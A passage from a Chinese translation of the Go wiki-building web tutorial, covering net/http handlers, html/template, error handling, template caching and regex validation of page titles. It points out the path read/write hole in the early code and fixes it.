\u7684\u6b63\u6587\u3002\u7136\u540e\u5c06\u6587\u4ef6\u8bfb\u5165\u7ed3\u6784\u4f53 p2 \uff0c\u5e76\u5c06\u5176 Body \u5143\u7d20\u6253\u5370\u5230\u5c4f\u5e55\u4e0a\u3002 \u60a8\u53ef\u4ee5\u50cf\u8fd9\u6837\u7f16\u8bd1\u548c\u8fd0\u884c\u7a0b\u5e8f\uff1a $ go build wiki.go $ ./wiki This is a sample Page. \uff08\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f Windows\uff0c\u5219\u5fc5\u987b\u952e\u5165\u4e0d\u5e26 \u201c./\u201d \u7684 \u201cwiki\u201d \u624d\u80fd\u8fd0\u884c\u7a0b\u5e8f\u3002\uff09 \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002 \u4ecb\u7ecd net/http \u5305 \uf0c1 \u8fd9\u662f\u4e00\u4e2a\u7b80\u5355 Web \u670d\u52a1\u5668\u7684\u5b8c\u6574\u5de5\u4f5c\u793a\u4f8b\uff1a //go:build ignore package main import ( \"fmt\" \"log\" \"net/http\" ) func handler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \"Hi there, I love %s!\", r.URL.Path[1:]) } func main() { http.HandleFunc(\"/\", handler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u8be5 main \u51fd\u6570\u4ee5\u5bf9 http.HandleFunc \u7684\u8c03\u7528\u5f00\u59cb\uff0c\u5b83\u544a\u8bc9 http \u7a0b\u5e8f\u5305\u4f7f\u7528 handler \u51fd\u6570\u5904\u7406\u5bf9 Web \u6839( \"/\" )\u7684\u6240\u6709\u8bf7\u6c42\u3002 \u7136\u540e\u5b83\u8c03\u7528 http.ListenAndServe \uff0c\u6307\u5b9a\u5b83\u5e94\u8be5\u5728\u4efb\u4f55\u63a5\u53e3 ( \":8080\" ) \u4e0a\u4fa6\u542c\u7aef\u53e3 8080 \u3002\uff08\u6682\u65f6\u4e0d\u8981\u62c5\u5fc3\u5b83\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 nil \u3002\uff09\u8fd9\u4e2a\u51fd\u6570\u5c06\u4e00\u76f4\u963b\u585e\uff0c\u76f4\u5230\u7a0b\u5e8f\u7ec8\u6b62\u3002 ListenAndServe \u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\uff0c\u56e0\u4e3a\u5b83\u53ea\u5728\u53d1\u751f\u610f\u5916\u9519\u8bef\u65f6\u8fd4\u56de\u3002\u4e3a\u4e86\u8bb0\u5f55\u8be5\u9519\u8bef\uff0c\u6211\u4eec\u5c06\u5728\u51fd\u6570 log.Fatal \u4e2d\u8c03\u7528\u3002 \u8be5\u51fd\u6570 handler \u7684\u7c7b\u578b\u4e3a http.HandlerFunc \u3002\u5b83\u4ee5 http.ResponseWriter \u548c http.Request \u4f5c\u4e3a\u53c2\u6570\u3002 \u4e00\u4e2a http.ResponseWriter \u503c\u7ec4\u5408\u4e86 HTTP \u670d\u52a1\u5668\u7684\u54cd\u5e94\uff1b\u901a\u8fc7\u5199\u5165\u5b83\uff0c\u6211\u4eec\u5c06\u6570\u636e\u53d1\u9001\u5230 HTTP \u5ba2\u6237\u7aef\u3002 http.Request \u662f\u8868\u793a\u5ba2\u6237\u7aef HTTP \u8bf7\u6c42\u7684\u6570\u636e\u7ed3\u6784\u3002 r.URL.Path \u662f\u8bf7\u6c42 URL \u7684\u8def\u5f84\u7ec4\u4ef6\u3002\u5c3e\u968f [1:] \u610f\u5473\u7740\u201c\u521b\u5efa\u4ece Path \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5230\u7ed3\u5c3e\u7684\u5b50\u5207\u7247\u201d\u3002\u8fd9\u4f1a\u4ece\u8def\u5f84\u540d\u4e2d\u5220\u9664\u524d\u5bfc\u201c/\u201d\u3002 \u5982\u679c\u60a8\u8fd0\u884c\u6b64\u7a0b\u5e8f\u5e76\u8bbf\u95ee URL\uff1a http://localhost:8080/monkeys \u8be5\u7a0b\u5e8f\u5c06\u663e\u793a\u4e00\u4e2a\u9875\u9762\uff0c\u5176\u4e2d\u5305\u542b\uff1a Hi there, I love monkeys! \u7528 net/http \u670d\u52a1 wiki \u9875\u9762 \uf0c1 \u8981\u4f7f\u7528\u8be5 net/http \u5305\uff0c\u5fc5\u987b\u5c06\u5176\u5bfc\u5165\uff1a import ( \"fmt\" \"os\" \"log\" \"net/http\" ) \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\uff0c viewHandler \u5b83\u5141\u8bb8\u7528\u6237\u67e5\u770b wiki \u9875\u9762\u3002\u5b83\u5c06\u5904\u7406\u4ee5\u201c/view/\u201d\u4e3a\u524d\u7f00\u7684 URL\u3002 func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) fmt.Fprintf(w, \"<h1>%s</h1><div>%s</div>\", p.Title, p.Body) } \u518d\u6b21\u6ce8\u610f\u4f7f\u7528 _ \u5ffd\u7565\u6765\u81ea loadPage \u7684\u8fd4\u56de\u503c error \u3002\u8fd9\u662f\u4e3a\u4e86\u7b80\u5355\u8d77\u89c1\uff0c\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e0d\u597d\u7684\u505a\u6cd5\u3002\u6211\u4eec\u7a0d\u540e\u4f1a\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002 \u9996\u5148\uff0c\u6b64\u51fd\u6570\u4ece\u8bf7\u6c42 URL \u7684\u8def\u5f84\u7ec4\u4ef6 r.URL.Path \u4e2d\u63d0\u53d6\u9875\u9762\u6807\u9898\u3002\u4f7f\u7528 [len(\"/view/\"):] \u5c06 Path \u91cd\u65b0\u5207\u7247\u4ee5\u5220\u9664\u8bf7\u6c42\u8def\u5f84\u7684\u524d\u5bfc \"/view/\" \u7ec4\u4ef6\u3002\u8fd9\u662f\u56e0\u4e3a\u8def\u5f84\u603b\u662f\u4ee5 \"/view/\" \u5f00\u5934\uff0c\u5b83\u4e0d\u662f\u9875\u9762\u6807\u9898\u7684\u4e00\u90e8\u5206\u3002 \u7136\u540e\u8be5\u51fd\u6570\u52a0\u8f7d\u9875\u9762\u6570\u636e\uff0c\u7528\u4e00\u4e32\u7b80\u5355\u7684 HTML \u683c\u5f0f\u5316\u9875\u9762\uff0c\u5e76\u5c06\u5176\u5199\u5165 http.ResponseWriter \u5bf9\u8c61 w . \u8981\u4f7f\u7528\u8fd9\u4e2a\u5904\u7406\u7a0b\u5e8f\uff0c\u6211\u4eec\u91cd\u5199\u6211\u4eec\u7684 main \u51fd\u6570\u6765\u521d\u59cb\u5316 http \u4f7f\u7528 viewHandler \u6765\u5904\u7406 /view/ \u8def\u5f84\u4e0b\u7684\u4efb\u4f55\u8bf7\u6c42\u3002 func main() { http.HandleFunc(\"/view/\", viewHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002 \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e9b\u9875\u9762\u6570\u636e\uff08\u4fdd\u5b58\u4e3a test.txt \uff09\uff0c\u7f16\u8bd1\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u5e76\u5c1d\u8bd5\u63d0\u4f9b\u4e00\u4e2a wiki \u9875\u9762\u3002 \u5728\u7f16\u8f91\u5668\u4e2d\u6253\u5f00 test.txt \u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4e2d\u4fdd\u5b58\u5b57\u7b26\u4e32\u201cHello world\u201d\uff08\u4e0d\u5e26\u5f15\u53f7\uff09\u3002 $ go build wiki.go $ ./wiki \uff08\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f Windows\uff0c\u5219\u5fc5\u987b\u952e\u5165\u4e0d\u5e26 \u201c./\u201d \u7684 \u201cwiki\u201d \u624d\u80fd\u8fd0\u884c\u7a0b\u5e8f\u3002\uff09 \u968f\u7740\u8fd9\u4e2a\u7f51\u7edc\u670d\u52a1\u5668\u7684\u8fd0\u884c\uff0c\u8bbf\u95ee http://localhost:8080/view/test \u5e94\u8be5\u4f1a\u663e\u793a\u4e00\u4e2a\u6807\u9898\u4e3a\u201ctest\u201d\u7684\u9875\u9762\uff0c\u5176\u4e2d\u5305\u542b\u201cHello world\u201d\u8fd9\u4e2a\u8bcd\u3002 \u7f16\u8f91\u9875\u9762 \uf0c1 wiki \u4e0d\u80fd\u6ca1\u6709\u7f16\u8f91\u9875\u9762\u7684\u80fd\u529b\u3002\u8ba9\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u65b0\u7684\u5904\u7406\u7a0b\u5e8f\uff1a\u4e00\u4e2a\u547d\u540d editHandler \u4e3a\u663e\u793a\u201c\u7f16\u8f91\u9875\u9762\u201d\u8868\u5355\uff0c\u53e6\u4e00\u4e2a\u547d\u540d saveHandler \u4e3a\u4fdd\u5b58\u901a\u8fc7\u8868\u5355\u8f93\u5165\u7684\u6570\u636e\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230 main() \uff1a func main() { http.HandleFunc(\"/view/\", viewHandler) http.HandleFunc(\"/edit/\", editHandler) http.HandleFunc(\"/save/\", saveHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) } \u51fd\u6570 editHandler \u52a0\u8f7d\u9875\u9762\uff08\u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u4e00\u4e2a\u7a7a Page \u7ed3\u6784\uff09\uff0c\u5e76\u663e\u793a\u4e00\u4e2a HTML \u8868\u5355\u3002 func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } fmt.Fprintf(w, \"<h1>Editing %s</h1>\"+ \"<form action=\\\"/save/%s\\\" method=\\\"POST\\\">\"+ \"<textarea name=\\\"body\\\">%s</textarea><br>\"+ \"<input type=\\\"submit\\\" value=\\\"Save\\\">\"+ \"</form>\", p.Title, p.Title, p.Body) } \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f46\u6240\u6709\u786c\u7f16\u7801\u7684 HTML \u90fd\u5f88\u4e11\u964b\u3002\u5f53\u7136\uff0c\u8fd8\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u3002 html/template \u5305 \uf0c1 \u8be5 html/template \u5305\u662f Go \u6807\u51c6\u5e93\u7684\u4e00\u90e8\u5206\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 html/template \u5c06 HTML \u4fdd\u5b58\u5728\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\uff0c\u5141\u8bb8\u6211\u4eec\u66f4\u6539\u7f16\u8f91\u9875\u9762\u7684\u5e03\u5c40\uff0c\u800c\u65e0\u9700\u4fee\u6539\u5e95\u5c42 Go \u4ee3\u7801\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5fc5\u987b\u6dfb\u52a0 html/template \u5230\u5bfc\u5165\u5217\u8868\u4e2d\u3002\u6211\u4eec\u4e5f\u4e0d\u4f1a\u518d\u4f7f\u7528 fmt \u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5220\u9664\u5b83\u3002 import ( \"html/template\" \"os\" \"net/http\" ) \u8ba9\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5305\u542b HTML \u8868\u5355\u7684\u6a21\u677f\u6587\u4ef6\u3002\u6253\u5f00\u4e00\u4e2a\u540d\u4e3a edit.html \u7684\u65b0\u6587\u4ef6\uff0c\u5e76\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff1a <h1>Editing {{.Title}}</h1> <form action=\"/save/{{.Title}}\" method=\"POST\"> <div><textarea name=\"body\" rows=\"20\" cols=\"80\">{{printf \"%s\" .Body}}</textarea></div> <div><input type=\"submit\" value=\"Save\"></div> </form> \u4fee\u6539 editHandler \u4ee5\u4f7f\u7528\u6a21\u677f\uff0c\u800c\u4e0d\u662f\u786c\u7f16\u7801\u7684 HTML\uff1a func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } t, _ := template.ParseFiles(\"edit.html\") t.Execute(w, p) } \u51fd\u6570 template.ParseFiles \u5c06\u8bfb\u53d6 edit.html \u7684\u5185\u5bb9\u5e76\u8fd4\u56de\u4e00\u4e2a *template.Template . \u65b9\u6cd5 t.Execute \u6267\u884c\u6a21\u677f\uff0c\u5c06\u751f\u6210\u7684 HTML \u5199\u5165 http.ResponseWriter \u3002\u5e26\u70b9\u7684 .Title \u548c .Body \u6807\u8bc6\u7b26\u6307\u7684\u662f p.Title \u548c p.Body \u3002 \u6a21\u677f\u6307\u4ee4\u7528\u53cc\u82b1\u62ec\u53f7\u62ec\u8d77\u6765\u3002\u8be5 printf \"%s\" .Body \u6307\u4ee4\u662f\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u5b83\u4ee5\u5b57\u7b26\u4e32\u8f93\u51fa .Body \u800c\u4e0d\u662f\u5b57\u8282\u6d41\u7684\u5f62\u5f0f\uff0c\u7c7b\u4f3c\u4e8e\u8c03\u7528 fmt.Printf \u3002\u8be5 html/template \u5305\u6709\u52a9\u4e8e\u786e\u4fdd\u6a21\u677f\u64cd\u4f5c\u4ec5\u751f\u6210\u5b89\u5168\u4e14\u5916\u89c2\u6b63\u786e\u7684 HTML\u3002\u4f8b\u5982\uff0c\u5b83\u4f1a\u81ea\u52a8\u8f6c\u4e49\u4efb\u4f55\u5927\u4e8e\u53f7( > )\uff0c\u5c06\u5176\u66ff\u6362\u4e3a &gt; \uff0c\u4ee5\u786e\u4fdd\u7528\u6237\u6570\u636e\u4e0d\u4f1a\u7834\u574f HTML \u8868\u5355\u3002 \u7531\u4e8e\u6211\u4eec\u73b0\u5728\u6b63\u5728\u4f7f\u7528\u6a21\u677f\uff0c\u8ba9\u6211\u4eec\u4e3a viewHandler \u8c03\u7528\u7684 view.html \u521b\u5efa\u4e00\u4e2a\u6a21\u677f\uff1a <h1>{{.Title}}</h1> <p>[<a href=\"/edit/{{.Title}}\">edit</a>]</p> <div>{{printf \"%s\" .Body}}</div> \u5bf9\u5e94\u4fee\u6539 viewHandler \uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) t, _ := template.ParseFiles(\"view.html\") t.Execute(w, p) } \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u5728\u4e24\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u4e86\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\u7684\u6a21\u677f\u4ee3\u7801\u3002\u8ba9\u6211\u4eec\u901a\u8fc7\u5c06\u6a21\u677f\u4ee3\u7801\u79fb\u52a8\u5230\u5b83\u81ea\u5df1\u7684\u51fd\u6570\u6765\u5220\u9664\u8fd9\u4e2a\u91cd\u590d\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, _ := template.ParseFiles(tmpl + \".html\") t.Execute(w, p) } \u5e76\u4fee\u6539\u5904\u7406\u7a0b\u5e8f\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570\uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } \u5982\u679c\u6211\u4eec\u5728 main \u4e2d\u6ce8\u91ca\u6389\u672a\u5b9e\u73b0\u7684\u4fdd\u5b58\u5904\u7406\u7a0b\u5e8f(saveHandler)\u7684\u6ce8\u518c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u6784\u5efa\u548c\u6d4b\u8bd5\u6211\u4eec\u7684\u7a0b\u5e8f\u3002 \u5355\u51fb\u6b64\u5904\u67e5\u770b\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\u3002 \u5904\u7406\u4e0d\u5b58\u5728\u7684\u9875\u9762 \uf0c1 \u5982\u679c\u4f60\u8bbf\u95ee http://localhost:8080/view/APageThatDoesntExist \u60a8\u5c06\u770b\u5230\u4e00\u4e2a\u5305\u542b HTML \u7684\u9875\u9762\u3002\u8fd9\u662f\u56e0\u4e3a\u5b83\u5ffd\u7565\u4e86\u9519\u8bef\u8fd4\u56de\u503c\uff0c\u5e76\u7ee7\u7eed\u5c1d\u8bd5\u586b\u5199\u6ca1\u6709\u6570\u636e\u7684\u6a21\u677f\u3002\u76f8\u53cd\uff0c\u5982\u679c\u8bf7\u6c42\u7684\u9875\u9762\u4e0d\u5b58\u5728\uff0c\u5b83\u5e94\u8be5\u5c06\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230\u7f16\u8f91\u9875\u9762\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u521b\u5efa\u5185\u5bb9\uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } \u51fd\u6570 http.Redirect \u5411 HTTP \u54cd\u5e94 \u6dfb\u52a0 HTTP \u72b6\u6001\u4ee3\u7801 http.StatusFound(302) \u548c\u6807\u5934 Location \u3002 \u4fdd\u5b58\u9875\u9762 \uf0c1 \u51fd\u6570 saveHandler \u5c06\u5904\u7406\u4f4d\u4e8e\u7f16\u8f91\u9875\u9762\u4e0a\u7684\u8868\u5355\u7684\u63d0\u4ea4\u3002\u53d6\u6d88\u6ce8\u91ca main \u4e2d\u7684\u76f8\u5173\u884c\u540e\uff0c\u8ba9\u6211\u4eec\u5b9e\u73b0\u5904\u7406\u7a0b\u5e8f\uff1a func saveHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/save/\"):] body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} p.save() http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } \u9875\u9762\u6807\u9898\uff08\u5728 URL \u4e2d\u63d0\u4f9b\uff09\u548c\u8868\u5355\u7684\u552f\u4e00\u5b57\u6bb5 Body \u5b58\u50a8\u5728\u4e00\u4e2a\u65b0\u7684 Page \u3002\u7136\u540e\u8c03\u7528\u8be5 save() \u65b9\u6cd5\u5c06\u6570\u636e\u5199\u5165\u6587\u4ef6\uff0c\u5e76\u5c06\u5ba2\u6237\u7aef\u91cd\u5b9a\u5411\u5230 /view/ \u9875\u9762\u3002 FormValue \u8fd4\u56de\u7684\u503c\u7c7b\u578b\u662f string \u3002\u6211\u4eec\u5fc5\u987b\u5c06\u8be5\u503c\u8f6c\u6362\u4e3a []byte \uff0c\u7136\u540e\u624d\u80fd\u5c06\u5176\u653e\u5165 Page \u7ed3\u6784\u4e2d\u3002\u6211\u4eec\u7528 []byte(body) \u6765\u6267\u884c\u8f6c\u6362\u3002 \u9519\u8bef\u5904\u7406 \uf0c1 \u5728\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6709\u51e0\u4e2a\u5730\u65b9\u4f1a\u5ffd\u7565\u9519\u8bef\u3002\u8fd9\u662f\u4e0d\u597d\u7684\u505a\u6cd5\uff0c\u5c24\u5176\u662f\u56e0\u4e3a\u5f53\u786e\u5b9e\u53d1\u751f\u9519\u8bef\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u51fa\u73b0\u610f\u5916\u884c\u4e3a\u3002\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u5904\u7406\u9519\u8bef\u5e76\u5c06\u9519\u8bef\u6d88\u606f\u8fd4\u56de\u7ed9\u7528\u6237\u3002\u8fd9\u6837\uff0c\u5982\u679c\u51fa\u73b0\u95ee\u9898\uff0c\u670d\u52a1\u5668\u5c06\u5b8c\u5168\u6309\u7167\u6211\u4eec\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u77e5\u7528\u6237\u3002 \u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5904\u7406 renderTemplate \u4e2d\u7684\u9519\u8bef\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, err := template.ParseFiles(tmpl + \".html\") if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } err = t.Execute(w, p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } http.Error \u51fd\u6570\u53d1\u9001\u6307\u5b9a\u7684 HTTP \u54cd\u5e94\u4ee3\u7801\uff08\u5728\u672c\u4f8b\u4e2d\u4e3a\u201c\u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u201d\uff09\u548c\u9519\u8bef\u6d88\u606f\u3002\u5c06\u5b83\u653e\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u51fd\u6570\u4e2d\u7684\u51b3\u5b9a\u5df2\u7ecf\u5f97\u5230\u4e86\u56de\u62a5\u3002 \u73b0\u5728\u8ba9\u6211\u4eec\u4fee\u590d saveHandler \uff1a func saveHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/save/\"):] body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err := p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } p.save() \u671f\u95f4\u53d1\u751f\u7684\u4efb\u4f55\u9519\u8bef\u90fd\u4f1a\u62a5\u544a\u7ed9\u7528\u6237\u3002 \u6a21\u677f\u7f13\u5b58 \uf0c1 \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u4f4e\u4e0b\uff1a\u6bcf\u6b21\u6e32\u67d3\u9875\u9762\u65f6 renderTemplate \u90fd\u4f1a\u8c03\u7528 ParseFiles \u3002\u66f4\u597d\u7684\u65b9\u6cd5\u662f ParseFiles \u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u8c03\u7528\u4e00\u6b21\uff0c\u5c06\u6240\u6709\u6a21\u677f\u89e3\u6790\u4e3a\u5355\u4e2a *Template \u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ExecuteTemplate \u65b9\u6cd5\u6765\u6e32\u67d3\u7279\u5b9a\u7684\u6a21\u677f\u3002 \u9996\u5148\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a templates \u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u7528 ParseFiles \u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316\u3002 var templates = template.Must(template.ParseFiles(\"edit.html\", \"view.html\")) \u51fd\u6570 template.Must \u662f\u4e00\u4e2a\u65b9\u4fbf\u7684\u5305\u88c5\u5668\uff0c\u5f53\u4f20\u9012\u4e00\u4e2a\u975e\u96f6 error \u503c\u65f6\u4f1a\u53d1\u751f\u6050\u614c(panic)\uff0c\u5426\u5219\u8fd4\u56de\u672a\u66f4\u6539\u7684\u503c *Template \u3002\u6050\u614c\u5728\u8fd9\u91cc\u662f\u5408\u9002\u7684\uff1b\u5982\u679c\u65e0\u6cd5\u52a0\u8f7d\u6a21\u677f\uff0c\u552f\u4e00\u660e\u667a\u7684\u505a\u6cd5\u662f\u9000\u51fa\u7a0b\u5e8f\u3002 ParseFiles \u51fd\u6570\u91c7\u7528\u4efb\u610f\u6570\u91cf\u7684\u5b57\u7b26\u4e32\u53c2\u6570\u6765\u6807\u8bc6\u6211\u4eec\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u5e76\u5c06\u8fd9\u4e9b\u6587\u4ef6\u89e3\u6790\u4e3a\u4ee5\u57fa\u672c\u6587\u4ef6\u540d\u547d\u540d\u7684\u6a21\u677f\u3002\u5982\u679c\u6211\u4eec\u8981\u5728\u7a0b\u5e8f\u4e2d\u6dfb\u52a0\u66f4\u591a\u6a21\u677f\uff0c\u6211\u4eec\u4f1a\u5c06\u5b83\u4eec\u7684\u540d\u79f0\u6dfb\u52a0\u5230 ParseFiles \u8c03\u7528\u7684\u53c2\u6570\u4e2d\u3002 \u7136\u540e\u6211\u4eec\u4fee\u6539 renderTemplate \u51fd\u6570\u4ee5\u4f7f\u7528\u9002\u5f53\u6a21\u677f\u7684\u540d\u79f0\u4f5c\u53c2\u6570\u8c03\u7528 templates.ExecuteTemplate \u65b9\u6cd5\uff1a func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { err := templates.ExecuteTemplate(w, tmpl+\".html\", p) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) } } \u8bf7\u6ce8\u610f\uff0c\u6a21\u677f\u540d\u79f0\u662f\u6a21\u677f\u6587\u4ef6\u540d\uff0c\u56e0\u6b64\u6211\u4eec\u5fc5\u987b\u9644\u52a0 \".html\" \u5230 tmpl \u53c2\u6570\u4e2d\u3002 \u9a8c\u8bc1 \uf0c1 \u6b63\u5982\u60a8\u53ef\u80fd\u5df2\u7ecf\u89c2\u5bdf\u5230\u7684\uff0c\u8be5\u7a0b\u5e8f\u6709\u4e00\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff1a\u7528\u6237\u53ef\u4ee5\u63d0\u4f9b\u4efb\u610f\u8def\u5f84\u4ee5\u5728\u670d\u52a1\u5668\u4e0a\u8bfb\u53d6/\u5199\u5165\u3002\u4e3a\u4e86\u7f13\u89e3\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u6765\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u9a8c\u8bc1\u6807\u9898\u3002 \u9996\u5148\uff0c\u6dfb\u52a0 \"regexp\" \u5230 import \u5217\u8868\u4e2d\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u6765\u5b58\u50a8\u6211\u4eec\u7684\u9a8c\u8bc1\u8868\u8fbe\u5f0f\uff1a var validPath = regexp.MustCompile(\"^/(edit|save|view)/([a-zA-Z0-9]+)$\") \u51fd\u6570 regexp.MustCompile \u5c06\u89e3\u6790\u548c\u7f16\u8bd1\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a regexp.Regexp \u3002 MustCompile \u4e0e Compile \u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5982\u679c\u8868\u8fbe\u5f0f\u7f16\u8bd1\u5931\u8d25\uff0c\u5b83\u5c06\u6050\u614c(panic)\uff0c\u800c Compile \u4f1a\u8fd4\u56de\u4e00\u4e2a error \u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\uff0c\u4f7f\u7528 validPath \u8868\u8fbe\u5f0f\u6765\u9a8c\u8bc1\u8def\u5f84\u5e76\u63d0\u53d6\u9875\u9762\u6807\u9898\uff1a func getTitle(w http.ResponseWriter, r *http.Request) (string, error) { m := validPath.FindStringSubmatch(r.URL.Path) if m == nil { http.NotFound(w, r) return \"\", errors.New(\"invalid Page Title\") } return m[2], nil // The title is the second subexpression. } \u5982\u679c\u6807\u9898\u6709\u6548\uff0c\u5b83\u5c06\u4e0e nil \u9519\u8bef\u503c\u4e00\u8d77\u8fd4\u56de\u3002\u5982\u679c\u6807\u9898\u65e0\u6548\uff0c\u8be5\u51fd\u6570\u5c06\u5411 HTTP \u8fde\u63a5\u5199\u5165\u201c404 Not Found\u201d\u9519\u8bef\uff0c\u5e76\u5411\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u9519\u8bef\u3002\u8981\u521b\u5efa\u65b0\u9519\u8bef\uff0c\u6211\u4eec\u5fc5\u987b\u5bfc\u5165 errors \u5305\u3002 \u8ba9\u6211\u4eec\u5728\u6bcf\u4e2a\u5904\u7406\u7a0b\u5e8f\u4e2d\u8c03\u7528 getTitle \uff1a func viewHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } p, err := loadPage(title) if err != nil { http.Redirect(w, r, \"/edit/\"+title, http.StatusFound) return } renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func saveHandler(w http.ResponseWriter, r *http.Request) { title, err := getTitle(w, r) if err != nil { return } body := r.FormValue(\"body\") p := &Page{Title: title, Body: []byte(body)} err = p.save() if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } http.Redirect(w, r, \"/view/\"+title, http.StatusFound) } \u51fd\u6570\u5b57\u9762\u91cf\u548c\u95ed\u5305 \uf0c1 